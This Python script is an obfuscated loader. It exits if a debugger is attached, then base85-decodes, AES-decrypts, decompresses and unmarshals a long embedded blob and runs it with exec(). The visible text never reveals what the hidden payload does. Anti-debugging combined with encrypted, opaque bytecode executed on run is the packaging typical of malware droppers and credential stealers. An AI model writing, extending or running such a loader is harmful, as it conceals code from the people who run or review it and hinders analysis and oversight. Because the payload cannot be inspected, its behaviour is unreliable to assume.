
import sys
import os
import base64
import hashlib
import marshal
import zlib
import traceback
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def _anti_debug():
    if sys.gettrace() or (os.name == 'nt' and __import__('ctypes').windll.kernel32.IsDebuggerPresent()):
        sys.exit(1)
_anti_debug()

_KEY = b'\x8b\xe6p4r\xfcZ\x08\xdf\xd9\x7fV\xd0\xf2\xe7\xf43\xa9[\x13\xb9ov\x87\xf2\x18RWOD\\\x9c'
_IV = b'\x05\x1f\xefU\xcfEIS\xbe\x15\x14\xee\x88\x05\x82\xa3'

def _decrypt_str(data):
    try:
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        return unpad(cipher.decrypt(data), 16).decode()
    except:
        return ""

def _main():
    try:
        _encrypted = 'W*s0x!j=A=7|_0`1ci<4QiFg~V1~pF8jJZi#mHE!8gh9_`MmM(amd)!^xSQo@q41G@u=+6a}n~1-Gl_XpxBoU3zZAQBCT0-{XNbSN&JQ~4Lo_!?JuUu&~(tirlfU(C18XpH3!;dB^qKPz`61tQH(^CX?e@7f0wi6Yc--&2Ga9({V9nPj2`55Z+^(>ctkaF@+KlS4B161>>1o>W%{{ZHnFDxl<$|5U05)9wUb)oiC;%VlhbSQ7I%v&U`A$OXqG0K9Wo|ij$;0i6=$|*fQBn@-DGRr;(2N+={>6pj>&bs#A$BjpQMrr>%t@O!+9eItsYP1Aq;k)T;RHb)l8MhAZ}A^MirYRV`FjF0B^ch&F2L`xF3F{#MSFPYQSb7C%rNsDS@@8yCP-PX7CHSJ?g*A_tPH~)22~4CU_V~sF-GJ170ZN))csOes4?F)Z;c$|3IuvjC%|uxN8yb=nyArnz0As1`oG?P#wwtu-;l14ln)nKjuX#p0bW^&fp%=8uO_4U+V+H`hYO{=|0DheL5em&gK4@7-pkahT&bS0OJzw)p66{#Z%TvO9gHef_yH{VBfW&H<>|2Zp`DIf_dMG6pnj2eCL15La{+!26FW0TAt0d$`=!K@uw~HKLaM*@?1Td`>@<=fn|!%y!!T#MMfSl#{iBGypXv2VF^fRx7wu_DNd0mmn24oHK;#tSF;^dBGn>kE4rgSue|ylO>C>!S7zEqYvP7DE%1s0cyDWIb@-uO?#7`JbMW`u+<=BBJJIc9bX;qJfXB+HT1<C*F6<Oc!$dsOKCs96UTZWg{{D19Ad#w+AN=<UMGN7iTT-0>60-ZIvOHBN^-#Sy1o8hpZ5tDmhq)qmUd9zKK)QjBn-~ua22s`}7WYORt<xwZj*9REQxhSo#w=#Zz;eLG#tQ1)z@k8e#sirR3mh#<?^%1)jW4Y+;<L0EAi0isO^+#!v`R+67|XP}yscb@YyAFvB(=+ZB-kuM_LHlf&wi^)Cj2n9SxY7k=q)aZL!%w+2~BN~Z5m=`;o5p%z81AtGz{_NM51V=LbcHF&g3fEZv>-`$l+R#T^6X=vV~L!p)a3VPg&5H(1y?*m8+Zm42g)lKtr`La`TqWe#fo3BsE_!N&q+)TolEWB)yq7m8U44v?v}SXxhwc*k02x*V)Yi!00aV-h!~^(&=-vhJWO83svHDfq!MlC_#X6(rbyk+DanB2W?0-`l$|rt`C|BjmK&y>i}PAn2UvsHEcSaey=juab`^!G=0T;%k#tLc+-IjpMSnAPq7yHC0}B81aIz$bp;ftNWcq10*Mq3ML-tFBHj&iSU#}SY(9V>Zv<u`2)NcZq6<_{r@eP=_O!y%=xaQ#%v!y;4dIt|HKhQZ6m(eECnb8l#cuEvN1~wWs<Ti*z<$o*85yGyymBg8<7_z2ue;|Ht=Jx76e&6rB3^HbjDw|QsKc#|rJ$9&|4019MsllmU&w18(TlV>g}YQeyEP}X^}7rk38j!Iys@sP_^YaZ-X-abiFai|!sg?!#7nvwtO6tS5|_~reIZJOv<x{B;3E@uEPht>{?4^P%De?UUMilr(^kxdOS+3zM$H<qS<XmW`!e-9D*@mB<M-G1H~}jHhwO_0ws7}V9`s_g0^6W!VBKebdv1##2<;bn)8rDE0DiGN=h`T;2G54X_%9kr%75sZnG?X{AEaqNS~yfWci)^;5Nphi84p_M%3p+NTeOUnF*7x3MCl@HLJrD+q|z=9Ah)frRLW}W+<=Y-)H7)GrAijKugmi_5hN*<irWd>drE4d*m2#z<wimliX<L(`6SAZBuq<yINvAJ^8a%OHifi4g8SghF5Ayn;#I0wEyKqe+Q%M8s~v-79=bGOMcgeZ#m>_rZuma=TQ<w-iG3YUUd(LoyWBN*JLcQ5FKC);h>imoi*?QMq#-JH{?1?7ICVtL29y|TAUbB8lMQ2dXO*MKQh$1zcE4RTx-Osh?5FgO)cyI0roRAgFMMHMrz@{+-bZxRku2#<r?B8MlRGh-!QH4ghI<8*AOim$^Qz{1OIN)p9b;VEKPwU437!uD-+v4H^N}8-+Oz1f_VE}eR6lw<u&t^ERKYYi#v!14nSp_W5B&t#^jJlht8b}WeTt`tst#%O1GR`5<ia9I)h6o+^crxaPqHcP*(LiG&xdWPWW`)oTTc*uT`8QVnPX3_q^JV$xN@T(b>p7G&EY|^MQ3qM7#JjQCB(zL`<hGg<48PwP+JZ}pfV|?BqAZOKX&ZH4Ox@<$lk`?yN6H)W)*;OWg+$5k|;UUf{@MPS!SNd?0)-aO}ngO0Cj)Jx;je_3&fSFS+_R;Zhx!R0-GyMHa08xN|`8xKtpb*W%ibGpa8rE_wNbkPKZNnkg@$yZoxt4w<$QIS!$BL3(sO$GMkkpkud`(c-sm)8_YKI-`qh_7Iu6F!c0z&rO|4+MT5h5l`^R!@9Ku8!<?vK+GQCU&V!k1RU~uWQZ97H`R%E)2RYd35iNYqGpgLY7$4GHmsr<*tq{~UPvu0&4`V<-?MAsCxkb4q3~>V9<*Eo*GO1FZLzV$pN-rGwZ;N33R9}q-`77GoD-G{V5D_^Rbi+m&CkkTKhz2TiQ=E9i^Vn(f>QahvYr!r|GWs+0-cz|am4W)!#GT-T8&ry9YAwCk4pj@vPN4{iN#89=yGBjbC(m%OxTsIbj&r#CHBJnJAE)rqFylldJy3<Bo!-1S-JeuDTdNmrdCs9d69s_^eULf(Q-L|jwCoVD9VwO6rH~@d{B9BrHVFdFi904QBS;cWmYDyOiN&JY_3B6v7Eq+j(Ne5%^G<TB`<y(+VfA2lz_e~>51M9OLrJrP%&vla^f!ozH@?QZVFp%VoFpH02pgM`-DFGff&s>)^+HQ1dFT`i#zKgng14@Oz#G=nT_NRK)kQwLmh))Z89LkL053*p<}Q^mBWV)(`+WA;<)vgQZL$BCL$Ud^)Tfr`^ysg3s^>iTvK;aeh=F|4O`{5-Z}$>cU0*uEN|Ao*QuDr%-{VBkLS=V;Sn+o?wM1(XlbNy8ha{t>nl(UjU;$P9XR>~0Jm$XJg%EygZX#G##g{8gHVE0&r!kPK6Y1-Ju|QzxdxfG$vTu)9|EPkw!?c^{y5ia1)5D4J(5?h<F`qE21TxAmbN#9^-Z!8&+xu`^Im=YGlNlR+i3G9#1KE&!=>UBySm;>Su^Rn>O${izaMd?Gh~9zkZzK*kT|yjDVVzLjg^sgM`3JsNt<y%5?`JdKmYc~AruUfq*l`RcOX>0ZNN=9&xV?umBbZ>BJLq#3s{)Z4WPFIjzEJ~Wcz_<#0%4T!E;>C&yT#M3&v0b-i(_|zYCo=`)zRfKN>BiKS6Qr>vS{^^<jD7e+;f@^njJTAarEEeG|U4%nK*@T!*Fl=3|?}fu5d?cAP;~|-Mkg$JxGg{7gd-Gm^>kEh3<Vxudo}29H1|Lje((o+UMAz8~{8LH=BxICht-@HEHfd-)ml#sOIy3I(^C(AKwC(qOA0Z{74R)<gzU}(Dxy8Lo#W^sNONzs8%=PEo=CzUVYNj&!$pNe#bZ=J0mmZ659QiUF?eOb^xaXmfK_1gT>vW3N~PtYhh~dlXj}ZGfi+bF^ETr7GXhN`n~;M<?dHmFYpnTWX!Jc3CHFZ^p)ySFwQlHj7oMVkRkX)zttr(h0m%t*IRufV2^F#ngxq5&b~@)O<Mp`<IQr>N}VL6CBYEwX0m$g{8T|s5`sq5$jQY?$>xxIfNL9ViXNfMnDM&c3t%N`Vqc3OXeld9TXAt9j3@I(mQgKrZCT8#jj1)qT$`iGJ$Z2<Z_cNS#=g89be_{YceAEq>Hc!rCUEy%ln?>dS_o-!R=KC;U!W&R^vJKxJ6-W9;_`~iZ3`BvCwFDaw@&`naxBRyj8gcP(~4Xd=98CU?`}n*Y<nSzcI!SfhNy@=A%2PYY@a3e>XDAb4eJS0$g_s6->`t0PL4V;X+S8cgr}C^7C^(MDdgLhT2~<5E}|hP*C!tC1XYtwIk~m9I@U;3=v%ex;N*abRRb>-V1_xrNid2yBC^fd#&lq<6J`H%cT>0Ydw+iy=BnCReMBaU7P>qhPO?{=km&Xl_lVwzt!j1PcaFsVus*;W5G`i!lGZC*ihV}g<uq}3-nxRO9-^!|wR`We(+KK5{8oe(^{wNz1b}qjH2YKV=&IvXUji!xIHuANZa02Q!_=R6wBy4pnNlq=Iq*a!E)=hw$A`E4>7=0WKcx;KY&bmkrY%jAQ^5IvT(ac3v4e2;T?ayNS4yzu%6MCO)FBpI*d{C<>>thX>kW~Dft(1&Ho_S0>^`A}$y+9$SrA8lOA3~fVs5Z+jFFtL?o|5cT#CwNWX0w|Mw~+Q@btfw@T(8rFxVHYH%K^RZ`#7r4eIlJKS1D2QF{}Iz9le)4-`aj!Bue_Y?s^hk4RT`QtvgJR};eM;Is`oy>6l~@;JZs?r2nQUBh9)j3>8X^zU3OiP?RqZLAQh+o+#6*OgYGa=VCWTRI%f_@3xIErAE0HV6f0NRH4vJT^^%B)|=kA2Cz354Zeb#VZmX-qYyi#Opl=ALX*Av;q&jjf&^F$HcqX#VjWmXOc|dEC4+2ZB^&iPU7W1lW(A*qa@2siS}Um)kri|)2bMtq=Pe~4keyX<pdY$C)inSQk)(7J0URUAqp`O_NiRXE5mp2FaXPZGyuHcdGggDN;|Y9ux9K`+_G!&$!e-!X{gShj00}my4;AEWdnfiqBDm59L7*PoQb{lD<P~D5nig6i8|nH{kJv;ua>XXcTlXQh?G}Ae4<1oV;F42>}qm5nMoxZztJzyuaE$-o-o%eyr!fBefWITUm#ZH=-~<RZ)NG&9r*U{H*9#3M~p;omgO|)w*>)_)NAdIdIRo=83{&ILjeN5QmA$_zvDyxC64Ip_My#0A5}24y}NRB?B%}8;RO8%o-k;a_7CvwLq6aXxGuy`6M@li#OJuT(ce-nnkEq5L4HZjHYHz5b)u>KKd?MXQurJ=>)N4eN^=6;&4@#iYqehS3M4Xj-6UhPN-qy0?rhmg!_No(k;X{$nOUdsNA;2TKkrv(SApYj=RiVaJ`=1GRUF(Qp**u*sR{ywouEw|0vu@*fh_O>k0Ikf0{CF^35$e*90O+2L9do%GRyp*$soh2ZLe&LGlTc&#LS<e=#7p&S~e<tI5oQ<_{F9iDRa(F#e+hf60&o7wUt-BkcG2?1Z4Nek;oZBD}XVcs5fLFVAO;h11mx?maw&>twxjzFOFDX?&c};+tsoExg7r;6F;R2WJWSb&zWm!`c8iz<SBD{P|!6G<Si$_v|VP~roWOnQN2CE{^n8IH(Ab`f{r5OD4?|LS3HFgZ+#tf@|)rH6XM$>C(hoVUaXEt9d0b{(5{MvH7WzyrsmR3R}&A;F3ThmfdGz=>Lv3BI}Gx2IWfuw&#%^tw(cHlx6)7vL_DTOjNa2R6-SSzhXZ_dA|k=nF!?5Sl}z@qnnj>;ir4J7!F`T7xc&;lScAY<AWFx+&~a0O)#2=i+F3lrB5*_%YgK|d2y@zVnvJ5FURCx^&RlyA_{I#dEfyR6N9~JwM_GI$BHf-HYT6bKe!xtdw?zXnVnzO6W<R+{j|ihp7i*ydYzSJf77d`{<z7&jgKCm_;NgRp(C22|x}jbtHd!B2z}{SCbeR1hi@v8G{U5?3Jw@WyV<%6Ut2nwqfMa|WKB{4kYq)AfAtH@38eOcM;f}FIXXF@rd6v#dRozy<eY!HZfW9El$-U&Bm;-V^XB;H_`?!gk>u>?fAGn#!z=Q8dX{-tojeY>k-kI(_&z9-_n?<x_@-$35D5xxw+0#BL?2czRf2|2LPH7YLN-U7P?P!mk%LCQo+2%jW!hN_fM80IY_WLU-W=PpMYN)P13@`sPpb2R^a3uXzWLaic*-yt4(m=_obFBzz8PU(|yeAe5<G9@+pvO=!=uF!uPI>qL;Y$YF6f^vGeFW>Klr}CzYn|Iy5BCj(5n^8e05a5l4OwJa*>+Q<FJzFC<?nNntqPx1@1Ij}5Lv|ONT8jqsmdiDlGEtEwJCci@G)Bj<W-z~<j{>ov)f@uaJq%<!r{TEQ@p-lV|2hi!2rt<ewm@fNKRvy`?ppJ`PJPyA}&#I)?{o*X0agg2ec?s9a@!Y-j|~gj6;|;40PeRu4WIVU-gb{EwWQLz8O9fw(es&{?TJ96d;Do10;T@ncjW@!Tk%Sl~3Jv*WvGFCk*T!FzHfrJ2J<Hi3gl!^x&@-pd8=x?_V}VCfYp&FIOb&KX%%g*Z|{DS0SLB3O|#>GXTom1fE=N#boqUQ^^`wQn25l#PM!=w{t!gzRTR%%-($-*xQms!R?b181bI2tk-cu1(^<64c&a%LB3=m-SPb8#U~Gjpt(mr5(~^PCe=mGRg_4$BgF)fDBNY?7G}9oYL``KCd`>HJ_IaYQqk;{EW~#&A7BwNo9q%-&ntZn9!UjbfPF}(V5Aw8D3FP5G8V&WX4EJX4aK(|ym0iem<P(O;bU}gGUOw+=sYZA-5A@uZz&$~wit(EG&(bMYVt<<cq`Q-1{Q|`Wa$}R@EG4$u?~R6CQROTS(j@3^bqjLELKZ~dQ}*i_pA889}pK2&0q1(JHj;dP~2G=^E))E3B!|lvpCOA2A#ccFh|qwA%$I2v}9Sk9D<xYju#ywiRy0C_{x&sF<c{_RS=PN;lbjp>)4*OFHxPU%)GhQ%0%NrQSJ+mIY0n>BqWF(;Ty17uatLKaa>b}^rJUzka3GguKOWhzL+J6H(siKL297)NuysJR&R-`p}njHl`J&zwG!U0)+=jrOR>Szi-_S$OYMoivXNl_yZcLA%+W<T()8MHd^6L}N+hHwJOcAu%xb#6*Yh_VZk*O@cELx3rkTkElr((~>+_021&wKmTY<s_U%9>TW<`gqd2G5h_bfnV<=?JoF~Y4&hln<-Odrt@NfPA7q8Wm~fu?*s?K%F&1XPWS(VtvI@J+S&LRA?j7zk(J**xdkepPk5HSF6jI%{X0qv0omxIJ8O=|NAUyT$5NOe_sjJay;MCSk4+M{a3o8tfNBq{*2-vwrab5hP>AjYa$%cdfSp;GCMUN>$ZPWRCK(VidLXfGvZq<gt^SHCb)~$1}O4GaUr3jSvu~=KV3CqP+R8wBYsC-iAa$%Ny>B?}T*_D)jPgKJlmXVVYMAo8i3%jx+qrRoYu?M%%09O$Eh=ohoU-|E9R+^`l{FAObl_alcH?^8L!Fvi3+hH&G3T-M0jGgP*+>>JHc0#X9-(=m6*hw&IYPF1HnxM?|XhzcMfjK@VjY`MrYH+<U~(Vi;NmWNBkx^Tbh0Ik|~7S)RM*MnI`H*d5yOaCY*+agK>@=B+d>dCn^2;#677C*dUv#GGL7TkJP3TF2l@SX#KHsY+@0A(t?OONE}RO_#6#cjsq#Do*Il50hUyx7ZIk_L3NB&#KL@_b||}JSQBw0LQ*S#JcH~a$Gt_fs#}+{Ow)C257WJ(#(8Nzxu!h>D~mb+ulWAw&z&9Seo5QpAfPRBOn8h3&<!j#IapFtAe<^4vM?p`69&5B<&kUWy{n<hSOtlI7?~V=(Rl>+Vswgdnht|$hf~%<#H-RJ9uOyODC8LmJkOu8SxbYpyvt0uX$*bfv!oGyYd10wC@)23=(zOwI)PpI8dM1#?hRvL><214fkxp9!voVVjrOa*&M&R#~VF76I!%kL|aVe*?ctVh~a8#yK>+KkU#A#_yb6HnoiY&R*@SARl4o;wy~lV#q!qUSbJJ~tsxP}GR%AFCu?8)YIbMiV@@Qti-wQ&*904;GMq);is?QTxVkW)3A^PP77mBj%(4OyU;s4{4-Elmb|Wp^byQ{X)92U8c;Yp4@0~5Dh2g4=D8{iiMHxP7Z(n{7s+3^)0g!!;Y@3nRmeV3$yK{j@=_kS-Z<ZO_D~rrVc#HFsLs#t`!XrIQ2p@a~SB^@Dls*aL&sK7^ZwM7nzjd_08<vG14hacuK7QDWQ@>zaRl11sa;+E7zJ6J_#rra)d2H?|JFhECBvEfpRGz?XI80cKwc<E%V-5~_2jWFm$F#STqZ!%4241VVoCm|o(6UK`df^I<*(%B5S1PRFjonoXWy$eIBF0$lXHTld&GrE~4*d7aeGhbcuN_*NFA4ZXAd5jKxvdjTlRQQ++V^#J7dQj>!+|S#&vMynbKv_1EbwsFoMh3Xx|r)me~bWS9O46`7He(z&^0c-Ps4s-i~$&l+>9@0X<7=E*+X~kO$_*)&zogJ;h`Quu1ELOdM~`xp=nchp_yqN*B70fJYCGGhGFo8RHZcWW<wQJD`elg0c%7|ov?D(mV4@tC%YV-P+>DdWMcKxP02q3Y!p7m5cqOb1+6J*Sy#4exUaQK*E--2YG#gHG2kr(G7jsG1fG73CrkuoIR`ZTYrlZZC6Owk7lq4fQ_9g+0ak3CIkSkLG$rZ#eWqQ>0a?B6D{$C#_hU2PLS^2_Wz~kz;0;5L@j=cLP=|g;{>WWk+f*R*I%;2S+*F88h=o!&Xu?rjwhsh|w<8|~V{*K9ws^C}xECCe&*>_H^l#fi%}o=qYl?Ovce~vlMt~T^s;zax=VThn?G^4^f{5SK;PDqpL$F>TF>Yf0!KbZY*9&a|4jE?4mZYr?Wcc&bcEssGOj=c_UuKDDZOW+9X+m=1EDQumJqf@s?>1VuefH8ChNxzWZ<7pH1>jbZjnf*S#X}EO<7YplDY(Iv)PrGBgiGyxbJ(kKi)bz^cC*5S*pd}UN3g0>HtPo}NR;ttMFi6fK9k`oG1~e_W>zZL)iUn&%Oz6>{KTPSP@Jlp@Y)LasVmO~vt>?;fvQGrq)eHO$humh-Mzbolz!Z1q_fKsoSaX7U*@cT89chVq-yEeHu)5gbX&87kjZ2k3zA6oxKe36>Si%{2juc|8#)b9PD@k-HO7zn)?RK~0ME)}?}hLnCJty?cS2J>TJB?+n!8@H)jwqMTz9WJYJS)t&WbkP=f)Cawh8$e#!yad%%#DQv=EH;RMG@|yMY&ZR$84C(JYiqvRy?bD9H;9KMKt@M}nDftmX|spkC`Fz!C<iyq=n}oKRRp-_N1KS}n;3vVKKH$r|Nk`-AhOylaSX#7nrC9*h)ilt{;;Mb;WZ(+RWhAF0q2047$iMahhUQO8S5xL(|Ys5opw7u4p8NUo)UfTF@eDN~~0$?|3TFq7mP$1wX-9X6Y9Ou={0L^FEyUFFbzMkMG4Q}M9LF->~r_~B2oeqd;2Jyq!A4yLay@Wm}|yH2F%C<vz!X)S2bYuxV+xh|Rapn9xyOayYfyr=Qtz<)q3<xWmP3L$D9%U2Qgn}9rGiAtqqTxeZ#PyxK0#|lUH+9cO4P1-?B?K$1pwcbT4%A8eX=i9<j4-Iy8`eb&4K|g`q|E8X>gZ75DyQ?JJ>+g(oI&CzgHITy6aQ3H5%I+byHpbee0Lw&#G;FF*zzUbKhOEj2WbdXbLg7a;k;5HOu6F)!mn~PDyxLpJkT&AEvO+GK-i${MtX+;{-k~8yX;wYXdjMY4TMGPPbr0rt?m**BFFlwxXbK*n?XjDfxdox*T_G|P2-S84q<=S81XalR*-A-itU}8h_HI&d<_u<D&SN?ew}og@m-_VTXlk`gx40#%`!OV{Op&mD7Pb!Lo~tZ{&8AC=KZLilgt7$AP~y+;-OLhY6Q2|2c|{3Ef`ThbBVRMKt1J(6iq_G~d2H)3+&64sI+ErwI}BLx0}N}=%KGd~mc}f+6Q6)}qaDpO404yZ*qwe=<MUw_{|s(aXbK>EzKY}^K`DoEwhm99JzDt^*wb)*0;7u~X5#jzLy)co@wXHxq{3l~uQ$eZWDu}me0P?5VXbQ@c8qn*Wm8}9(KF;6%9yqX>UO6$@_C}jy}>0#%;eXcmWY*Jj^0W{v6-nI&v@1w;pykDQGMJz>PeNfA#=rLGhB0G*C!K=+2xeVHI;G2iEBZz2mOv_EhR1^h26J;FEfo{#>e5<ObVJ|rZgwDZ!AI7KdJ*)Mri3+-_O-^x0?IOH>Ki-mov>0Qm&J<7%5oHNBK{xDw=zf{xtL0zS1iEC}^tbjuhuFdyy*;hMVqd{xz&Ne;XOZ`ImJ3q8B=XA_2-5{j^FdG1TtHO?1Xdp6RCQ*vG(w5Q5;0i;KR^vN%SCPu<)X5G7RFZ5}NA`4V6m2ez8pO~1P^Jp5{rjNpoH>?Yibv0ANk)i%svWcp@3fk7t$qKgErO$}m@1ZAl6yE9o@ecVV-uFxfk@VU1)QGLz_XVEe{Kvq%kqur50b`eyhPW%3o0cNY0ZHrvkn!C;=l(<2$oP0Te)?VDvwi5{SI~oz4WH(_<sa0!_J3~x;3+C~~Wg(w5EYPQ#pWbhF&kGFnFoIq3Ug)N7=%^)+#&fgC&4tM^e}7YBGpJi!z;!(ToY_c;><|t%VtL}=0gPkdgTG0>Fgi@ja)AEp<vdk;nf{->8<OM2UY=dr)X0e(p4#P=h7?oIzb4|*OwCH2nA{k^R>~2>RM-5x+N<38iqEJ(=mk#owA_{mPAbnR+&S_kL1wcR-631Y^v6IApn3rAQb^&7hTKpPtlD-G9OATb#y_!1tw^`7k%ezft2VJ_GD6f)v`Zc5;~;zT9-``+H&N(I*?40piEHQ45P&!BQ&Xu1we@uz>d`8v5I0_$^c-;dH<R;5nUeUt5J=6-CbZWb*w@E@>$d6@z%wh=HJRpXgJCx;X`muL=XJo2aFrN*03goh9P@nEWmz9i=iZGziy9rtNP%KSNkmB`{}f}Ojbx;qK<&QL^h^xDf%Hwvz7VM9X~n@q-#|+|aw)OOr~kldxU1c6e5Kd60X6A?&WZwTQv^L2Vz>^zP!8o3QNOc;s|24y(kWL30(Wy+PYu%v3MlcHTqs4`k>X?>2TRMcyYpo!b=h4<>!;in*u;nO0--ShudOFTe3GW|E>}ik2;=!#e9)z2J<V7|dO7s3?;JVXwcG^GuN<c>(``b(v%C>=(hyn6jtL;$g6Fk^_ehOXlywxGv5w7Ek3ig+pYhh3JnYij<L!*12NG93vGBC{B^>`pq?hk3dno4Q9uV6e|BT$VZzT^NN;O*b><sN%QMAUPlwi@V)uNRzJMiZq%1r57<z8i^VB@GWKRIEr`YbwP-~|olaS`cF<(Tj6lsthVlfg>Ol_fs<B=_wMae{afAk!GKrbSS%v343aOcxUFSE+oqefS0|I~4}=@}Z2_&>P9?3o`8{P4PMG;GoI@XJTWoY&SEKE6ogTJC+56q2J$ALJt^f1W=93mL4yWmFP%E^SpPLb?ae3)<;2v?_spkxJ`O?B2oR&C{*wS`AadTU?0ooAdrX<hj#)miB0C{lf}CNytW6=eVC-}QaB?=?S3T!e>Hpk@QuEoTOREj?swoe4AFl7`cX}06gMr0<&nG0XT_3z(6rA4VdmpT9k-ghKnHyMH&t+15SvVeF=RnAefc9Q4=6n91gpUMiV8jtqjGT1`l~&#{}eemSG`pV>Al)+B~J#N-jm3kz(o+-a}OXeakr@&rDvxa#aHX4+;Y%tdL6M{U0_QC(wEIQW`_ubHteb^&)S4i(w5>vD^U8E^5`r3a8Dj-;LxU7_q3ymi|zHD6bmQINp5-Fp>`$yG>zpj2&2GrX5J1krP#8PXY~2wlSDW3`()O<3X}{WW{iKK%)ky#bsbuWaw9++;x64OjF%>U%RWnjNV~SR?>warp!?9!XxuU<GGA!$P>y%kHFR(P#3`y0W;(qgbJVLMZ7s~g2?0$k&`p2X8=rL|B6+6!Ham1UAPk_<7EW_82z@=<5Ot%~vEmXg|G}9>2>B;-C%Z;HAClnN`@^162{UYeAZ(OCpmF}z*yIt|FpE_E*{pu&u?aS?RvsbrU$?~FC&8fzQKQ+gdnd<SzSvu%r4iY#E_({Il~EZVxl=2&u(!`x|En~7`&A`0R)@b|%9phX?XejQUS*{0YpWFl{sz*DrF55{L9KQSL+?;@7D$Rjyu|{DQ!nwZwac<ri`b3~(4waHcd&(C->=FZNtokgmd$OmUNtlw(hobA7)lOdKWhcYr#pL(WCeyN1E=Q|pdAHYz7b3cxQGKlO^P*3Z~)7`B_>09rnkS(%nUsQoJnavbkjsdI}Uwmsmxf`%PdO%uLou-egl#>!yLtFGIs~G()O_I2F4Ke4f=q$E#<|=-&KWzU_5#*>jba5$I5$g;NHhG80aw_S9@_gU;Ods`Kr_aKqdm1+#h3g<l0IB30tXz%MQE4Fj<F8NRPwe%G}x*(a-ie?)T{8?1#vZ7jm>w3naq%x;<{CIn!%REm;)!0gI{%vh7QY6#>t2iujAphL++WnTltOy0p=A6+0QC^45LDh3K@gUJELg^2pBsVCbHW;32jRmZ(Q<vC24*xI*dWLEZtW#|in$gZrf`fzkoD<a<b9vaUF4Kth}!Y%xv@wA0Sr1Q3xlyzW)CWKe6@PkP7wN_)#tExx8xQr=fCj`W!#d~uB9QC{962`aLYP}2iCtJqjzU!g!4kj;8IJ8XF*Z9@hrz(rxGvDk+qFrY_MJhTllY2_IM9&IOscSf5p63X2iog2xv#SAz^ydCLu)ES-N?fuHSH_f9k+st2i3;2bZ*a+c0oS8<umFHn0&&i#wp?Z1D+rF3Rh~@ak{CZ<^#RiQm8S!id*Ek9th!!h+>=TY#@G$)}wWujTKr<qD+_lWtf2svLm5h8Hh*jyY05k1_V#;vwTS%2XW{K+v)*=qQwi%H5IjlCMUr5TKm7r*vDUJ&(HP3!Zr}&NH8)2mh`gDOC4<Z~8i9@cE;q-$`@3~xtHmsw!poex+BJJ3-55e|GrA+LK8|eB1zyrC?;5jSj<HOsRjN7zP*Xa4ql=OSKb;|@EeQ$10JLg|yi(q37r2K1yobC2!SWECuD*>c>?*AaxShH29aI=mV#<*vHPMz$^B(KkM2eJwfvI}UT^W6uY;cY>*ej=brJRm_T6|ig|fRc3<Cb&69ZMNoUdgITz*!Sm(LEBT)hrl4AtbWnW-m9en-1IeUc7W9f3Dx%NbOCRwo#w7y$pVg7eg<K+`dP8dDWsN0L7J0m;P02qL{<vR{kf;+s850tU2RfUxXKiCE`v8t>v+IbQ*bjfm?}+6;5xRT888-eyd%jgZT||e1B1DnPH5%%*0>zwq=Bj}L*N`%Me2eAvm{<a^i$QH&+2l+3o%aPurwdCi@=_kHXjwd>8UFwZ1#*-P`Fdve3gF;?PhSesC?#hs5`*49XX}W(3(VqYx9H69Ra8165`kc<S|;QXgD}>8u5E${hnJea}~r>j$@Q$F8}2v!%G7b;01`aOma)-<6dd>ALQN~PZM4EsbX{hT86yv^=esLOm4@gb)98;0-$zr1@H{eyU^_9MjQ2GN$*@%m$+wqROVc1A~{g+d74MdP1gGUV6VvIum>H9o`EO$t$)E|v=puCjTlUIIL^Imzt?%2d1&}-OJ`crCmUnC58dMi(54LQ_A8KbsjAGqGp;^sgX&6A+@u@IBI<G0%j?0d)-q!|QYNpO!TAFVyKC>tZ06ztd9qJa$ws9(h?v(1BvkdYAuMC<LDO0b5;Zg;M4%aYcg(2&`2&6gsJ0Vp7kR6tP1OlXEoB#Jqjb4SU_$H(j>tqEm*0Ce>7#@%*EqvvH&7C~p;v!?F-kzs++H!Irceh0M2AgZ!K$ahlYY*|V!t6sEdO|=8cMNtaAc-AnwZ^mG`MCg>6q_|@$v%TTK@o{<C1Bt)UR~a|8(@fN|xtic-{ASKuyaG9acoeBa0#R4fT3YSttxs1o|q;MB@w1ogPzbX+kKiRFQ}<>W*aE88B})#hWll$_tvN;D4ejbQDF2=<Os1rj8*WSDbU1slQLF6|lM3Z7vIttol?hz<BA~US*xlBahZYZf6_cE|_wM)hMj!N8$KjZ^EMp@AH^#eapya)2_E}Jnp$9Yti1ezxPciKH;5O?Z00+OswzPhm?J{?s3^n-J^yOP64xrXyv6=5D>cjMX3wdfn=|VDOF_fe>UTUl?g4Cwhe+U6y{f^+F#g|=CCW8iwZ>_{Vg+uW4S_G@-WiAeDRS-vRYn|k>Oh2VAv>L)vI795qUx_M4{tGT%wF_4+q1h7~D0kqr=0&F9&+hBDxHByWidP7jGq_3_l<=$q!2v=dfSkqWhsWuNR7%MN1cE1vYkSW%R5}>5K$nfxEpNVr40d1_jC=x93w}a%g29Zb+HzcMuUCFgax!V({1R#)!3rvtkGV5~C#BrD8Z?I|s0gKT1TpNy(I_Ut=lBCU6L!;AyVIF1r!epFwuu7rg@?N$$RXgr<yr(@#8&'
        
        # Decryption steps
        cipher = AES.new(_KEY, AES.MODE_CBC, _IV)
        encrypted_data = base64.b85decode(_encrypted)
        decrypted_data = unpad(cipher.decrypt(encrypted_data), 16)
        decompressed_data = zlib.decompress(decrypted_data)
        
        exec(marshal.loads(decompressed_data), {
            **globals(),
            '__name__': '__main__',
            '__builtins__': __builtins__,
            '_decrypt_str': _decrypt_str
        })
    except Exception as e:
        print("Execution failed:")
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    _main()
        